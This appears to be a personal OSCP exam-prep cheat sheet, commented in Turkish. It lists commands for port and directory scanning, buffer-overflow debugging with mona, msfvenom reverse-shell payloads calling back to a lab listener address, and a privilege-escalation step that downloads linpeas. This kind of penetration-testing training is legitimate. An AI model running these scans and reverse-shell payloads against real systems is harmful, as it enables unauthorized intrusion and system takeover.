# OSCP-Prep-Notes

## İlk taramalar

nmap -sS -sV -v IP -p- #Tüm portlara stealth scan at.


gobuster dir -u http://192.168.174.101/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -t 20 #dir taraması

#-x php,txt,py,c,js,bak,gz,tar,html,db,php.bak,key,jsp,asp # extension taraması

#-b 404 -s 201 # status code özelleştirme

## BOF

!mona config -set workingfolder c:\mona\%p

!mona bytearray -b "\x00"

!mona compare -f C:\mona\<PATH>\bytearray.bin -a <ESP_ADDRESS/EBX_ADDRESS>

--

msfvenom -p linux/x86/shell_reverse_tcp LHOST=192.168.119.136 LPORT=4444 -b "\x00\x0a\x0d\x20\x37" -o exploit.txt
sfvenom -p windows/shell_reverse_tcp LHOST=192.168.119.136 LPORT=4444 EXITFUNC=thread -b "\x00\x0a\x0d\x25\x26\x2b\x3d" -f c
msfvenom -p windows/exec CMD="cmd.exe" -b '\x00\x0a\x1a' -f c

msf-pattern_create -l 5000 > exploit.txt
msf-pattern_offset -q 413461A2 -l 5000







## Privilege Escalation

wget "https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh" -O linpeas.sh

sudo -l
